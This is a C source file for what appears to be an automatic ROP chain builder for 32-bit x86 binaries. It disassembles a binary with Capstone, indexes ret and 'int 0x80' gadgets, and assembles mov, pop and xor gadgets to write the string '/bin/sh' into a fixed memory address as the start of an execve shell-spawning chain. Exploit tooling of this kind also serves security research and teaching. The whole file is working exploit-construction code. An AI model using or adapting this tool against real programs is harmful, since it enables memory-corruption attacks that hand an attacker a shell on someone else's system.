#include "rop.h"

int rop_chain(unsigned char **chain, unsigned char *binary, unsigned long binary_len, struct Arg *arg)
{
    struct Node *root;
    int result;
    root = (struct Node *)malloc(sizeof(struct Node));
    if(!root)
    {
        fprintf(stderr ,"malloc failed.\n");
        return -1;
    }
    struct Gadget *head;
    head = (struct Gadget *)malloc(sizeof(struct Gadget));
    if(!head)
    {
        fprintf(stderr ,"malloc failed.\n");
        return -1;
    }
    *chain = (unsigned char *)malloc(sizeof(unsigned char));
    if(!*chain)
    {
        fprintf(stderr ,"malloc failed.\n");
        return -1;
    }
    rop_parse_gadgets(root, binary, binary_len, arg);
    result = rop_chain_execve(root, head, arg);
    if(!result)
    {
        result = rop_chain_list_traverse(head, chain);
    }
    rop_chain_list_free(head);
    tree_free(root);
    return result;
}

int rop_parse_gadgets(struct Node *root, unsigned char *binary, unsigned long binary_len, struct Arg *arg)
{
    size_t count;
    csh handle;
    cs_insn *insn;
    char gadget_string[MaxGadgetLen];
    unsigned int text_address = 0x08048000;
    int total_gadget = 0;
    size_t i,j,k;

    tree_init(root);

    if(cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
        return -1;
    }
    for(i = 0; i < binary_len - MaxGadgetByte; i++)
    {
        count = cs_disasm_ex(handle, binary + i, MaxGadgetByte, text_address + i, 0, &insn);
        if(count > 0)
        {
            strcpy(gadget_string, "");
            for(j = 0; j < count; j++)
            {
                /* Drop the gadgets start with ret */
                if(!strcmp(insn[0].mnemonic, "ret"))
                {
                    break;
                }
                /* Ret-type gadgets */
                else if(!strcmp(insn[j].mnemonic, "ret") && j)
                {
                    total_gadget++;
                    for(k = 0; k < j; k++)
                    {
                        if(arg->print && strlen(gadget_string)
                        + strlen(insn[k].mnemonic) + strlen(insn[k].op_str) + 7 < MaxGadgetLen)
                        {
                            strcat(gadget_string, insn[k].mnemonic);
                            if(strlen(insn[k].op_str) > 0)
                            {
                                strcat(gadget_string, " ");
                                strcat(gadget_string, insn[k].op_str);
                            }
                            strcat(gadget_string, " ; ");
                        }
                    }
                    /* tree build */
                    tree_build(root, 0, insn, j+1);
                    if(arg->print && strlen(gadget_string) + 3 < MaxGadgetLen)
                    {
                        strcat(gadget_string, "ret");
                        /* print all gadgets */
                        printf("%d\t0x0%x:\t%s\n", j+1, text_address + i, gadget_string);
                    }
                    strcpy(gadget_string, "");
                    break;
                }
                else if(j == 0 && !strcmp(insn[j].mnemonic, "int") && !strcmp(insn[j].op_str, "0x80"))
                {
                    total_gadget++;
                    /* tree build */
                    tree_build(root, 0, insn, j+1);
                    if(arg->print == 1)
                    {
                        /* print int80 gadgets */
                        printf("%d\t0x0%"PRIx64":\tint 0x80\n", j+1, insn[j].address);
                    }
                    break;
                }
            }
            cs_free(insn, count);
        }
    }
    printf("Gadget find = %d\n",total_gadget);
    cs_close(&handle);
    return 0;
}

int rop_chain_execve(struct Node *root, struct Gadget *head, struct Arg *arg)
{
    int result = 1;
    struct Gadget *writeMEM;

    result = rop_build_write_memory_gadget(root, &writeMEM, arg);
    if(result == -1)
    {
        rop_chain_list_free(writeMEM);
        printf("Build WriteMEM Gadgets Failed\n");
        return -1;
    }
    printf("\n--- Start chain *execve(\"/bin/sh\")* gadgets ---\n\n");
    rop_chain_list_init(head);

    rop_write_memory_gadget(head, writeMEM, 0x080ef060, 0x6e69622f);
    rop_write_memory_gadget(head, writeMEM, 0x080ef064, 0x68732f2f);
    rop_write_memory_gadget(head, writeMEM, 0x080ef068, 0);

    rop_chain_list_free(writeMEM);
    return 0;
}

int rop_write_memory_gadget(struct Gadget *head, struct Gadget *writeMEM, unsigned int dest, unsigned int value)
{
    int i = 0;
    struct Gadget *temp;
    char string_value[4];
    temp = writeMEM->next;
    /* bypass xor gadget */
    if(value == 0)
    {
        rop_chain_list_add(head, temp->address, temp->string, 1);
    }
    temp = temp->next;
    for(; temp; temp = temp->next)
    {
        if(!strcmp(temp->string, "temp"))
        {
            if(i == 0)
            {
                if(value != 0)
                {
                    memcpy(string_value, &value, 4);
                    rop_chain_list_add(head, value, string_value, 1);
                }
                i++;
            }
            else
            {
                rop_chain_list_add(head, dest, "dest", 1);
            }
        }
        else
        {
            if(value != 0 || i != 0)
            {
                rop_chain_list_add(head, temp->address, temp->string, 1);
            }
        }
    }
    return 1;
}
int rop_build_write_memory_gadget(struct Node *root, struct Gadget **writeMEM, struct Arg *arg)
{
    struct Node *temp,*mov_temp;
    char gadget_string[MaxGadgetLen] = "";
    char regexp_string[MaxRegExpLen] = "";
    char op[2][4];
    int i, depth, restart;
    printf("\n1. Build WriteMem Gadgets\n");
    while(true)
    {
        restart = 0;
        *writeMEM = (struct Gadget *)malloc(sizeof(struct Gadget));
        if(!*writeMEM)
        {
            fprintf(stderr ,"malloc failed.\n");
            return -1;
        }
        rop_chain_list_init(*writeMEM);

        /* find mov gadget */
        memset(gadget_string, 0, MaxGadgetLen);
        strcpy(regexp_string, "mov dword ptr .e[abcds][xip]], e[abcds][xip]");
        for(depth = 1; depth < arg->depth; depth++)
        {
            mov_temp = tree_search(root, regexp_string, gadget_string, depth, arg);
            if(mov_temp)
            {
                printf(" O: Find MOV Gadget \"%s\"\n", gadget_string);
                break;
            }
            else if(depth == arg->depth-1)
            {
                printf(" X: Can't find gadget \"%s\"\n", regexp_string);
                return -1;
            }
        }
        strncpy(op[0], &gadget_string[15], 3);
        strncpy(op[1], &gadget_string[21], 3);
        op[0][3] = 0;
        op[1][3] = 0;
        if(!strcmp(op[0], "esp") || !strcmp(op[1], "esp"))
        {
            printf(" X: Can't use esp gadget. Try to find other mov gadget\n");
            mov_temp->vaild = 0;
            continue;
        }
        rop_chain_list_add(*writeMEM, mov_temp->address, gadget_string, 1);

        /* find pop e_x gadget */
        for(i = 0; i < 2; i++)
        {
            memset(gadget_string, 0, MaxGadgetLen);
            strcpy(regexp_string, "^pop ___$");
            strncpy(&regexp_string[5], op[i], 3);
            for(depth = 1; depth < arg->depth; depth++)
            {
                temp = tree_search(root, regexp_string, gadget_string, depth, arg);
                if(temp)
                {
                    printf(" O: Find POP Gadget \"%s\"\n", gadget_string);
                    break;
                }
                else if(depth == arg->depth-1)
                {
                    printf(" X: Can't find gadget \"%s\" Try to find other mov gadget\n", regexp_string);
                    mov_temp->vaild = 0;
                    rop_chain_list_free(*writeMEM);
                    restart = 1;
                    break;
                }
            }
            if(!restart)
            {
                rop_chain_list_add(*writeMEM, 0xffffffff, "temp", 0);
                rop_chain_list_add(*writeMEM, temp->address, gadget_string, 0);
            }
            else
            {
                break;
            }
        }
        if(restart)
        {
            continue;
        }

        /* find xor e_x gadget */
        memset(gadget_string, 0, MaxGadgetLen);
        strcpy(regexp_string, "^xor ___, ___");
        strncpy(&regexp_string[5], op[1], 3);
        strncpy(&regexp_string[10], op[1], 3);
        for(depth = 1; depth < arg->depth; depth++)
        {
            temp = tree_search(root, regexp_string, gadget_string, depth, arg);
            if(temp)
            {
                printf(" O: Find XOR Gadget \"%s\"\n", gadget_string);
                break;
            }
            else if(depth == arg->depth-1)
            {
                printf(" X: Can't find gadget \"%s\" Try to find other mov gadget\n", regexp_string);
                mov_temp->vaild = 0;
                rop_chain_list_free(*writeMEM);
                restart = 1;
                break;
            }
        }
        if(restart)
        {
            continue;
        }
        rop_chain_list_add(*writeMEM, temp->address, gadget_string, 0);
        break;
    }
    return 1;
}

void rop_chain_list_init(struct Gadget *head)
{
    head->next = 0;
    head->prev = 0;
}

int rop_chain_list_add(struct Gadget *head, unsigned int address, char *string, int tail)
{
    struct Gadget *gadget;
    if(strlen(string) > MaxGadgetLen)
    {
        fprintf(stderr ,"Gadget buffer overflow.\n");
        return -1;
    }

    gadget = (struct Gadget *)malloc(sizeof(struct Gadget));
    if(!gadget)
    {
        fprintf(stderr ,"malloc failed.\n");
        exit(-1);
    }
    gadget->address = address;
    gadget->next = NULL;
    strcpy(gadget->string, string);
    if(head->next)
    {
        if(tail == 1)
        {
            gadget->prev = head->prev;
            head->prev->next = gadget;
            head->prev = gadget;
        }
        else
        {
            gadget->next = head->next;
            head->next->prev = gadget;
            head->next = gadget;
        }
    }
    else
    {
        head->next = gadget;
        head->prev = gadget;
    }
    return 0;
}

int rop_chain_list_traverse(struct Gadget *head, unsigned char **chain)
{
    struct Gadget *temp;
    unsigned char *rechain;
    size_t i = 0;
    for(temp = head->next; temp; temp = temp->next)
    {
        i++;
        printf("0x%08x: %s\n", temp->address, temp->string);
        rechain = (unsigned char*)realloc(*chain, i * 4 * sizeof(unsigned char));
        if(!rechain)
        {
            fprintf(stderr ,"realloc failed.\n");
            exit(-1);
        }
        *chain = rechain;
        memcpy(*chain + (i-1) * 4, &temp->address, 4);
    }
    return i * 4;
}

void rop_chain_list_free(struct Gadget *head)
{
    struct Gadget *temp;
    while(head->next != NULL)
    {
        temp = head->next;
        head->next = head->next->next;
        free(temp);
    }
    free(head);
}
